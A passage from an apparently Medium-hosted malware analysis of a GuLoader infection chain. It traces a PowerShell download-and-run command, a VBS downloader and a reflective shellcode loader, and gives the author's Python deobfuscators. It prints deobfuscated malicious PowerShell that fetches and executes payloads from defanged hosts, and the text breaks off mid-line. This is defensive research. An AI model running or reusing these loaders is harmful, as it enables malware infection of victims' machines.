1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M1kSxhLk9LpFS1rRAkN1sw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*M1kSxhLk9LpFS1rRAkN1sw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*M1kSxhLk9LpFS1rRAkN1sw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*M1kSxhLk9LpFS1rRAkN1sw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*M1kSxhLk9LpFS1rRAkN1sw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*M1kSxhLk9LpFS1rRAkN1sw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*M1kSxhLk9LpFS1rRAkN1sw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*M1kSxhLk9LpFS1rRAkN1sw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="984" loading="lazy" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 4: Decoy document</figcaption></figure><p id="6ff2" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Interestingly enough, when googling for this company, it seems their website is currently compromised and abused for advertisement redirection. Directly opening the page via the URL seems to work fine though. Still, this behavior could hint at a potential compromise of the company&#x27;s website.</p><p id="8e4c" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">However, it’s the second part of the PowerShell command that is more interesting:</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="b997" class="pk oh gu ph b bg pl pm l pn po">Invoke-WebRequest hxxps://shorturl[.]at/guDHW -O C:\Windows\Tasks\Reilon.vbs; C:\Windows\Tasks\Reilon.vbs&lt;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</span></pre><p id="707e" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Upon execution, this command reaches out to hxxps://shorturl[.]at/guDHW which in turn redirects to hxxps://img.softmedal[.]com/uploads/2023-06-23/298186187297.jpg. Again, the “.jpg” ending is only used to hide the real file type of this script, potentially slipping through some detection measures. The file is saved as “C:\Windows\Tasks\Reilon.vbs”, revealing its real file type as a Virtual Basic script, and then executed as well.</p></div></div></div><div class="ab cb ny nz oa ob" role="separator"><span class="oc by bm od oe of"></span><span class="oc by bm od oe of"></span><span class="oc by bm od oe"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="9b90" class="og oh gu bf oi oj ok dy ol om on ea oo ms op oq or mw os ot ou na ov ow ox oy bk">Stage 2: Reilon.vbs — Virtual Basic Downloader</h2><p id="560c" class="pw-post-body-paragraph mh mi gu mj b mk oz mm mn mo pa mq mr ms pb mu mv mw pc my mz na pd nc nd ne gn bk">After manually downloading the Reilon.vbs file, below is a cropped overview of what we get:</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng pr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*soBwWhzM9rMH81tjgtQ3aA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*soBwWhzM9rMH81tjgtQ3aA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*soBwWhzM9rMH81tjgtQ3aA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*soBwWhzM9rMH81tjgtQ3aA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*soBwWhzM9rMH81tjgtQ3aA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*soBwWhzM9rMH81tjgtQ3aA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*soBwWhzM9rMH81tjgtQ3aA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*soBwWhzM9rMH81tjgtQ3aA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*soBwWhzM9rMH81tjgtQ3aA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*soBwWhzM9rMH81tjgtQ3aA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*soBwWhzM9rMH81tjgtQ3aA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*soBwWhzM9rMH81tjgtQ3aA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*soBwWhzM9rMH81tjgtQ3aA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*soBwWhzM9rMH81tjgtQ3aA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="495" loading="eager" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 5: Reilon.vbs</figcaption></figure><p id="8340" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">The functionality of this script is pretty straightforward: After defining the Ttheds array, it makes use of an empty loop to postpone execution by 10 seconds. Consequently, a large string is created by joining several sub-strings together. Following that, the initial Ttheds array and a loop are used to create the word “powershell” which is then stored in a variable. In the end, the Shell.Application.ShellExecute command is used to execute the joined string as a PowerShell command. The joined string that gets obfuscated can be seen in Figure 6.</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng ps"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*8H6AHoaTVWHkDwCTbZOyLg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*8H6AHoaTVWHkDwCTbZOyLg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*8H6AHoaTVWHkDwCTbZOyLg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*8H6AHoaTVWHkDwCTbZOyLg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*8H6AHoaTVWHkDwCTbZOyLg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*8H6AHoaTVWHkDwCTbZOyLg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8H6AHoaTVWHkDwCTbZOyLg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*8H6AHoaTVWHkDwCTbZOyLg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*8H6AHoaTVWHkDwCTbZOyLg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*8H6AHoaTVWHkDwCTbZOyLg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*8H6AHoaTVWHkDwCTbZOyLg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*8H6AHoaTVWHkDwCTbZOyLg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*8H6AHoaTVWHkDwCTbZOyLg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*8H6AHoaTVWHkDwCTbZOyLg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="121" loading="lazy" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 6: Gr2 joined string</figcaption></figure><p id="1894" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As can be seen at first glance, the command is obfuscated yet again. When adding in some new lines, we can see that there is a function called Milj379, which is called on every line, with an obfuscated string as an argument. We can therefore safely assume that the function is used to deobfuscate the remaining commands.</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng pt"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ebIqZSq0HyHsYxHr-o16Gw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ebIqZSq0HyHsYxHr-o16Gw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ebIqZSq0HyHsYxHr-o16Gw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ebIqZSq0HyHsYxHr-o16Gw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ebIqZSq0HyHsYxHr-o16Gw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ebIqZSq0HyHsYxHr-o16Gw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ebIqZSq0HyHsYxHr-o16Gw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ebIqZSq0HyHsYxHr-o16Gw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ebIqZSq0HyHsYxHr-o16Gw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ebIqZSq0HyHsYxHr-o16Gw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ebIqZSq0HyHsYxHr-o16Gw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ebIqZSq0HyHsYxHr-o16Gw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ebIqZSq0HyHsYxHr-o16Gw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ebIqZSq0HyHsYxHr-o16Gw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="250" loading="lazy" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 7: Cleaner View</figcaption></figure><p id="0404" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">To make things easier I created a simple Python deobfuscator using this function. It makes use of RegEx to identify each occurrence of the Milj379 function call, then takes the string that needs to be deobfuscated and at the end, it replaces the string with its deobfuscated counterpart.</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="666e" class="pk oh gu ph b bg pl pm l pn po">import re<br/><br/># Define the deobfuscation function<br/>def Milj379(Endoph):<br/>    Fald = &quot;&quot;<br/>    for Episper in range(1, len(Endoph) - 1, 2):<br/>        Ddvgt = Endoph[Episper]<br/>        Fald += Ddvgt<br/>    return Fald<br/><br/># Add code between &quot;&quot;&quot;<br/>code = &quot;&quot;&quot;<br/>code here<br/>&quot;&quot;&quot;<br/><br/><br/># Variable to set the name of the deobfuscation function<br/>deobfuscation_func_name = &quot;Milj379&quot;<br/><br/># Regular expression pattern to match the deobfuscation function calls<br/>pattern = rf&quot;{deobfuscation_func_name}\s*&#x27;(.*?)&#x27;&quot;<br/><br/># Find all occurrences of the deobfuscation function calls<br/>matches = re.findall(pattern, code)<br/><br/># Deobfuscate and replace the calls with deobfuscated strings<br/>for match in matches:<br/>    deobfuscated = globals()[deobfuscation_func_name](match)<br/>    code = code.replace(f&quot;{deobfuscation_func_name} &#x27;{match}&#x27;&quot;, deobfuscated)<br/><br/># Print the updated code<br/>print(code)</span></pre><p id="895d" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Running this script results in the extracted PowerShell command seen below:</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="05f5" class="pk oh gu ph b bg pl pm l pn po">$Gydep = hxxp://194.55.224[.]183/kng/Persuasive.inf;<br/>$Stryger = \syswow64\WindowsPowerShell\v1.0\powershell.exe;<br/><br/><br/>.(iex) ($Advertize2=$env:windir) ;<br/><br/>.(iex) ($Stryger=$Advertize2+$Stryger) ;<br/><br/>.(iex) ($Exploit = ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split [char]34);<br/><br/>.(iex) ($Unlacer = $Exploit[$Exploit.count-2]);<br/><br/># Check if powershell is 64-bit<br/>.(iex) ($Modtagn=(Test-Path $Stryger) -And ([IntPtr]::size -eq 8)) ;<br/><br/># If powershell 64bit -&gt; execute again but in 32bit, else nothing<br/>if ($Modtagn) {.$Stryger $Unlacer;<br/>} else {;<br/><br/># Download payload from above link<br/>$Fald00=Start-BitsTransfer -Source $Gydep -Destination $Advertize2;<br/><br/><br/>.(iex) ($Advertize2=$env:appdata) ;<br/>.(iex) (Import-Module BitsTransfer) ;<br/><br/># Save to AppData\Roaming\opbrugenda.Dal<br/>$Advertize2=$Advertize2+&#x27;\opbrugende.Dal&#x27;;<br/><br/>while (-not $Joyf) {.(iex) ($Joyf=(Test-Path $Advertize2)) ;<br/>.(iex) $Fald00;<br/>.(iex) (Start-Sleep 5);<br/>}<br/><br/># Get downloaded file content<br/>.(iex) ($Milj37 = Get-Content $Advertize2);<br/><br/># DeBase64<br/>.(iex) ($Hamart = [System.Convert]::FromBase64String($Milj37));<br/><br/># Get ASCII String<br/>.(iex) ($Fald2 = [System.Text.Encoding]::ASCII.GetString($Hamart));<br/><br/># Extract &quot;19271 Byte Payload&quot; starting at Byte 193539<br/>.(iex) ($Rawnessa=$Fald2.substring(193539,19271));<br/><br/># Execute<br/>.(iex) $Rawnessa;<br/>}</span></pre><p id="2e7b" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">The deobfuscated script gives away its functionality. First of all, it makes sure that the current script is executed using PowerShell 32bit. If not the case, an if condition is used to execute the script another time using the correct architecture. This is likely done to make sure the shellcode downloaded in a later stage is executed under the correct architecture. The script then continues to download a file from the URL: hxxp://194.55.224[.]183/kng/Persuasive.inf . The content of this file is then stored to “$env:appdata\Roaming\opbrugenda.Dal”. To get to the next stage, the content of the downloaded file is base64 decoded and interpreted as an ASCII string. Afterward, a certain set of Bytes is extracted from the string and executed via PowerShell. This set of Bytes will be analyzed in the next section.</p></div></div></div><div class="ab cb ny nz oa ob" role="separator"><span class="oc by bm od oe of"></span><span class="oc by bm od oe of"></span><span class="oc by bm od oe"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="b34e" class="og oh gu bf oi oj ok dy ol om on ea oo ms op oq or mw os ot ou na ov ow ox oy bk">Stage 3: Reflective GuLoader shellcode loader</h2><p id="02b9" class="pw-post-body-paragraph mh mi gu mj b mk oz mm mn mo pa mq mr ms pb mu mv mw pc my mz na pd nc nd ne gn bk">As with the last section, this code is again obfuscated using its own function. Additionally, to further obfuscate the code, a bunch of comments containing random words were added.</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng pu"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*JqIrxqRwYiLy819BD9nlbA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*JqIrxqRwYiLy819BD9nlbA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*JqIrxqRwYiLy819BD9nlbA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*JqIrxqRwYiLy819BD9nlbA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*JqIrxqRwYiLy819BD9nlbA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*JqIrxqRwYiLy819BD9nlbA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JqIrxqRwYiLy819BD9nlbA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*JqIrxqRwYiLy819BD9nlbA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*JqIrxqRwYiLy819BD9nlbA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*JqIrxqRwYiLy819BD9nlbA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*JqIrxqRwYiLy819BD9nlbA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*JqIrxqRwYiLy819BD9nlbA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*JqIrxqRwYiLy819BD9nlbA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*JqIrxqRwYiLy819BD9nlbA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="372" loading="eager" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 8: Obfuscated Stage 3</figcaption></figure><p id="2ee5" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">So before doing anything else, we can delete all lines starting with “#”. After doing so, we are faced with an obfuscated PowerShell script yet again. This time our deobfuscation function is called “Claro02”.</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng pv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*d1uJxehdURlJSwkQ_jRcoQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*d1uJxehdURlJSwkQ_jRcoQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*d1uJxehdURlJSwkQ_jRcoQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*d1uJxehdURlJSwkQ_jRcoQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*d1uJxehdURlJSwkQ_jRcoQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*d1uJxehdURlJSwkQ_jRcoQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d1uJxehdURlJSwkQ_jRcoQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*d1uJxehdURlJSwkQ_jRcoQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*d1uJxehdURlJSwkQ_jRcoQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*d1uJxehdURlJSwkQ_jRcoQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*d1uJxehdURlJSwkQ_jRcoQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*d1uJxehdURlJSwkQ_jRcoQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*d1uJxehdURlJSwkQ_jRcoQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*d1uJxehdURlJSwkQ_jRcoQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="400" loading="lazy" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 9: Claro02 Deobfuscation function</figcaption></figure><p id="e5b9" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">In this case, deobfuscation of the strings is done by taking an obfuscated hexadecimal string, XORing it with 255 (0xFF), and converting the output to ASCII. Again, here is a script that does just this for all strings and does the replacement as well:</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="26c0" class="pk oh gu ph b bg pl pm l pn po">import re<br/><br/># Define the deobfuscation function<br/>def Claro02(Echino):<br/>    xor_value = 255<br/>    Ahantchu = bytearray(len(Echino) // 2)<br/>    for loudensres in range(0, len(Echino), 2):<br/>        Hilse = Echino[loudensres:loudensres+2]<br/>        Ahantchu[loudensres//2] = int(Hilse, 16) ^ xor_value<br/>    return Ahantchu.decode(&#x27;ascii&#x27;)<br/><br/># Sample code<br/>code = &quot;&quot;&quot;<br/>code here<br/>&quot;&quot;&quot;<br/><br/># Variable to set the name of the deobfuscation function<br/>deobfuscation_func_name = &quot;Claro02&quot;<br/><br/># Regular expression pattern to match the deobfuscation function calls<br/>pattern = rf&quot;{deobfuscation_func_name}\s*&#x27;([^&#x27;]*)&#x27;&quot;<br/><br/># Find all occurrences of the deobfuscation function calls<br/>matches = re.findall(pattern, code)<br/><br/># Deobfuscate and replace the calls with deobfuscated strings<br/>for match in matches:<br/>    deobfuscated = Claro02(match)<br/>    code = code.replace(f&quot;{deobfuscation_func_name} &#x27;{match}&#x27;&quot;, f&quot;&#x27;{deobfuscated}&#x27;&quot;)<br/><br/># Print the updated code<br/>print(code)</span></pre><p id="fb31" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">After deobfuscating the script we get the following output:</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="d155" class="pk oh gu ph b bg pl pm l pn po"># Function Claro05: Retrieves a function pointer for a given function name from a specified module<br/>function Claro05 ($Acce, $Gratierne) {<br/>    # Get the type of the assembly that contains the functions<br/>    $Inspi930 = &#x27;$tutorenbu = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\&#x27;)[-1].Equals(&quot;System.dll&quot;) }).GetType(&quot;Microsoft.Win32.UnsafeNativeMethods&quot;)&#x27;<br/>    .(&#x27;IEX&#x27;) $Inspi930<br/><br/>    # Get the method info for the delegate for a native function pointer<br/>    $Inspi935 = &#x27;$Falangistu = $tutorenbu.GetMethod(&quot;GetProcAddress&quot;, [Type[]] @([System.Runtime.InteropServices.HandleRef], [string]))&#x27;<br/>    .(&#x27;IEX&#x27;) $Inspi935<br/><br/>    # Invoke the delegate for a native function pointer<br/>    $Inspi931 = &#x27;return $Falangistu.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($tutorenbu.GetMethod(&quot;GetModuleHandle&quot;)).Invoke($null, @($Acce)))), $Gratierne))&#x27;<br/>    .(&#x27;IEX&#x27;) $Inspi931<br/>}<br/><br/># Function Claro04: Defines a dynamic assembly and type for creating delegates<br/>function Claro04 {<br/>    Param (<br/>        [Parameter(Position = 0)]<br/>        [Type[]] $Embraceko,<br/>        [Parameter(Position = 1)]<br/>        [Type] $Brands = [Void]<br/>    )<br/>    $Inspi932 = &#x27;$Typeout = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&quot;ReflectedDelegate&quot;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&quot;InMemoryModule&quot;, $false).DefineType(&quot;MyDelegateType&quot;, &quot;Class, Public, Sealed, AnsiClass, AutoClass&quot;, [System.MulticastDelegate])&#x27;<br/>    .(&#x27;IEX&#x27;) $Inspi932<br/><br/>    $Inspi933 = &#x27;$Typeout.DefineConstructor(&quot;RTSpecialName, HideBySig, Public&quot;, [System.Reflection.CallingConventions]::Standard, $Embraceko).SetImplementationFlags(&quot;Runtime, Managed&quot;)&#x27;<br/>    .(&#x27;IEX&#x27;) $Inspi933<br/><br/>    $Inspi934 = &#x27;$Typeout.DefineMethod(&quot;Invoke&quot;, &quot;Public, HideBySig, NewSlot, Virtual&quot;, $Brands, $Embraceko).SetImplementationFlags(&quot;Runtime, Managed&quot;)&#x27;<br/>    .(&#x27;IEX&#x27;) $Inspi934<br/><br/>    $Inspi935 = &#x27;return $Typeout.CreateType()&#x27;<br/>    .(&#x27;IEX&#x27;) $Inspi935<br/>}<br/><br/># Retrieve the delegate for a native function pointer for the ShowWindow function from USER32<br/>$Claro01 = &#x27;$Efte = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 &quot;USER32&quot; &quot;ShowWindow&quot;), (Claro04 @([IntPtr], [UInt32]) ([IntPtr])))&#x27;<br/>.(&#x27;IEX&#x27;) $Claro01<br/><br/># Retrieve the delegate for a native function pointer for the GetConsoleWindow function from kernel32<br/>$Claro02 = &#x27;$Fingalb198 = 